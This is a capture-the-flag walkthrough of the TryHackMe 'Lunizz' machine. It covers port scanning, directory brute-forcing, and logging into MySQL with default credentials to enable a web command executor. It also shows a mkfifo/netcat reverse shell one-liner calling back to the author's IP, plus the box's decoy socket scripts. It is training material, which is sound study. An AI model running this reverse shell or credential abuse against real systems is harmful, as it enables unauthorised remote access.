# Lunizz CTF — Writeup

## Overview
### Lunizz CTF — Writeup
### Lunizz CTF — Writeup
![](https://cdn.pixabay.com/photo/2016/11/08/05/20/adventure-1807524_960_720.jpg)
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/9ae7a76f89ebbb00ec6ef240268804bc.png)
### Are you able to solve this challenge?
Start Machine
10.10.72.102
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.72.102 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.72.102:80
Open 10.10.72.102:3306
Open 10.10.72.102:4444
Open 10.10.72.102:5000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.72.102 [4 ports]
Discovered open port 80/tcp on 10.10.72.102
Discovered open port 3306/tcp on 10.10.72.102
Discovered open port 4444/tcp on 10.10.72.102
Discovered open port 5000/tcp on 10.10.72.102
Completed Connect Scan (4 total ports)
Initiating Service scan
Scanning 4 services on 10.10.72.102
Completed Service scan (4 services on 1 host)
NSE: Script scanning 10.10.72.102.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.72.102
Host is up, received user-set (0.25s latency).

PORT     STATE SERVICE    REASON  VERSION
80/tcp   open  http       syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql      syn-ack MySQL 5.7.33-0ubuntu0.18.04.1
| ssl-cert: Subject: commonName=MySQL_Server_5.7.33_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_5.7.33_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| MD5:   0b701b5f166e426932e301be40f8f6e7
| SHA-1: 2866e1efd2809bcf6cecb15c27b7af15cde1f92b
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfNS43LjMzX0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTIxMDIxMTIzMTIzMFoXDTMxMDIwOTIzMTIzMFowQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzUuNy4zM19BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDRCvq9/K5fEQO0juxe6NG4
| zjV1A5DR/lgWgraEiLmYANxmlN4MY6dy79NnaeCI8fRSjergQIJzFbNWc5mfm6NC
| E3eaLq2X9eN7+KdR2q7VNjJ/fF3D7k4ewa0GnBNGbC2AyoYrFKXxAN6qGU831qU4
| aMNcNCAXcJqqF4rW+3Vjlj8h2/ZkYkRJsVUEz5k6esNYRsVPu7JSFkRLE4lV8Xg9
| vL9arCA9BgR4sE1FqI7mA9DLUcoEZlJXwgl67oad5sxW+GPuZeUF4jF583C8vBhN
| WRtHWPytjQLe69N8BTthbdabtyQI2HMBEGSEDF6U2AJj8OiC3AXUs3L9p//hL/1p
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBAHPpnm2k
| 2U9nkklYcE0M2LEWyQE8IJozVMLMZ3KvuTF49+eUGXUeEvoJQnOi6P5ELvc57gGY
| 5QcAdpmqAbdE6vA1jnvK825LCl/L1zpsqXpkj4gu5Znavl2Rs0wXvhGhlj3PlNQu
| SKoSi+s729CulT6OU+JV9NDIOQlzoSfHCHo02t0D006dnx1ko1J/CtWqFi6mPF8u
| jqb87kTDBtMPXEO9OKrWKKjxBBQlVAIgu+VAn3TfeEX5moOZO84Uv7ul6GuJ2Xg3
| J4tSOB1aj0YJcgRXPbYXXf8AgOnMMXv18ZW1x49P5Yro58JyjioZiY7d9bHArRy5
| nuBjGrsuWRNAqBM=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.33-0ubuntu0.18.04.1
|   Thread ID: 6
|   Capabilities flags: 65535
|   Some Capabilities: LongPassword, Support41Auth, IgnoreSigpipes, FoundRows, ConnectWithDatabase, LongColumnFlag, ODBCClient, InteractiveClient, Speaks41ProtocolOld, SwitchToSSLAfterHandshake, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsCompression, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsTransactions, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: is\x17x\x03@1<?Hp6\x08px&3E [
|_  Auth Plugin Name: mysql_native_password
4444/tcp open  tcpwrapped syn-ack
5000/tcp open  tcpwrapped syn-ack

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.30 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.72.102 4444    
Can you decode this for me?
bGV0bWVpbg==
letmein
root@lunizz:# id
FATAL ERROR

┌──(witty㉿kali)-[~/Downloads]
└─$ echo 'bGV0bWVpbg==' | base64 -d
letmein 

┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.72.102 5000
OpenSSH 5.1
Unable to load config info from /usr/local/ssl/openssl.cnf 

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.72.102/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.72.102/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.72.102/hidden               (Status: 301) [Size: 313] [--> http://10.10.72.102/hidden/]
http://10.10.72.102/whatever             (Status: 301) [Size: 315] [--> http://10.10.72.102/whatever/]
http://10.10.72.102/server-status        (Status: 403) [Size: 277]

http://10.10.72.102/whatever/index.php
Command Executer Mode :0
ls

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.72.102/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.72.102/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.72.102/instructions.txt     (Status: 200) [Size: 339]

┌──(witty㉿kali)-[~/Downloads]
└─$ curl http://10.10.72.102/instructions.txt
Made By CTF_SCRIPTS_CAVE (not real)

Thanks for installing our ctf script

#Steps
- Create a mysql user (runcheck:CTF_script_cave_changeme)
- Change necessary lines of config.php file

Done you can start using ctf script

#Notes
please do not use default creds (IT'S DANGEROUS) <<<<<<<<<---------------------------- READ THIS LINE PLEASE

┌──(witty㉿kali)-[~/Downloads]
└─$ mysql -h 10.10.72.102 -uruncheck -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 19
Server version: 5.7.33-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| runornot           |
+--------------------+
2 rows in set (0.277 sec)

MySQL [(none)]> use runornot;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [runornot]> show tables;
+--------------------+
| Tables_in_runornot |
+--------------------+
| runcheck           |
+--------------------+
1 row in set (0.343 sec)

MySQL [runornot]> describe runcheck;
+-------+---------+------+-----+---------+-------+
| Field | Type    | Null | Key | Default | Extra |
+-------+---------+------+-----+---------+-------+
| run   | int(11) | YES  |     | NULL    |       |
+-------+---------+------+-----+---------+-------+
1 row in set (0.284 sec)

MySQL [runornot]> select run from runcheck;
+------+
| run  |
+------+
|    0 |
+------+
1 row in set (0.299 sec)

https://www.guru99.com/sql-update-query.html#:~:text=MySQL%20Update%20Command%20Syntax&text=UPDATE%20%60table_name%60%20is%20the%20command,must%20be%20in%20single%20quotes.

MySQL [runornot]> UPDATE runcheck SET run = 1;
Query OK, 1 row affected (0.305 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [runornot]> select run from runcheck;
+------+
| run  |
+------+
|    1 |
+------+
1 row in set (0.238 sec)
MySQL [runornot]> exit;
Bye

command executer : which nc
Command Executer Mode :1
/bin/nc 

revshell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.19.103 1337 >/tmp/f

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.72.102] 54396
bash: cannot set terminal process group (965): Inappropriate ioctl for device
bash: no job control in this shell
www-data@lunizz:/var/www/html/whatever$ python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@lunizz:/proct/pass$ cd /var/backups/.script
cd /var/backups/.script
www-data@lunizz:/var/backups/.script$ ls
ls
fakessh.log  runasroot.log  runasroot.py  ssh.py
www-data@lunizz:/var/backups/.script$ cat runasroot.py
cat runasroot.py
import socket
import base64
import random

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 4444))
s.listen(5)

passarray = ["extremehardrootpassword", "extremesecurerootpassword", "p@ssword", "letmein", "randompassword"]

while True:
        c, addr = s.accept()
        with open("/var/backups/.script/runasroot.log", "a") as f:
                f.write("Connection Accepted From {}\n".format(addr))
        choice = random.choice(passarray)
        passwd = base64.b64encode(choice.encode())
        c.sendall(b"Can you decode this for me?\n")
        c.sendall(passwd + b"\n")
        with open("/var/backups/.script/runasroot.log", "a") as f:
                f.write("Password Sent, Password :{}\n".format(choice))
        getpasswd = c.recv(4096)
        with open("/var/backups/.script/runasroot.log", "a") as f:
                f.write("Client Sent Password :{}\n".format(getpasswd.decode()))
        if choice == getpasswd.decode().strip():
                c.sendall(b"root@lunizz:# ")
                c.recv(4096)
                c.sendall(b"FATAL ERROR")
        else:
                c.sendall(b"Wrong Password")
                c.close()

www-data@lunizz:/var/backups/.script$ cat ssh.py
cat ssh.py
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 5000))
s.listen(5)

while True:
        c, addr = s.accept()
        with open("/var/backups/.script/fakessh.log", "a") as f:
                f.write("Bamboozled Client :{}\n".format(addr))
